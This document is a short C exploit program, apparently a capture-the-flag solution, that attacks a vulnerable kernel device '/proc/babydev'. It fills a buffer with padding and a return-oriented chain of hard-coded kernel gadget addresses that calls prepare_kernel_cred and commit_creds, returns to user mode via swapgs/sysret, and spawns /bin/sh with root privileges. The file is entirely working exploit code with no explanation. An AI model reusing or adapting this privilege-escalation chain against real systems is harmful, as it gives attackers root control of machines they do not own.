static void get_shell(void)
{
    char *argv[] = {"/bin/sh", 0};
    execve(argv[0], argv, 0);
}

int main(void)
{
    int fd = open("/proc/babydev", O_RDWR);
    if (fd < 0) {
        return -1;
    }

    static const uint64_t prepare_kernel_cred = 0xffffffff81052a60;
    static const uint64_t commit_creds = 0xffffffff81052830;
    // pop rax; pop rdi; pop rsp; swapgs; sysret
    static const uint64_t syscall_ret = 0xFFFFFFFF81200147;

    // 0xffffffff81079d8d: pop rdi; ret; 
    static const uint64_t pop_rdi_ret = 0xffffffff81079d8d;
    // 0xffffffff81183059: mov rdi, rax; mov qword ptr [rdi], 1; pop rbp; ret; 
    static const uint64_t mov_rdi_rax = 0xffffffff81183059;
    // 0xffffffff811330a8: pop r11; pop rbp; ret; 
    static const uint64_t pop_r11_rbp = 0xffffffff811330a8;
    // 0xffffffff8105cd7b: pop rcx; ret; 
    static const uint64_t pop_rcx = 0xffffffff8105cd7b;
    // 0xffffffff8186a720: pop rsp; ret; 
    static const uint64_t pop_rsp = 0xffffffff8186a720;

    uint64_t rop[] = {
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,

        pop_rdi_ret,
        0,

        prepare_kernel_cred,

        mov_rdi_rax,
        0,

        commit_creds,

        pop_r11_rbp,
        0x202,
        0,

        pop_rcx,
        (uint64_t) &get_shell,

        syscall_ret,
        0,
        0,
        (uint64_t)__builtin_frame_address(0),
    };

    write(fd, ((char *)rop) + 4, sizeof(rop) - 4);

    return 0;
}
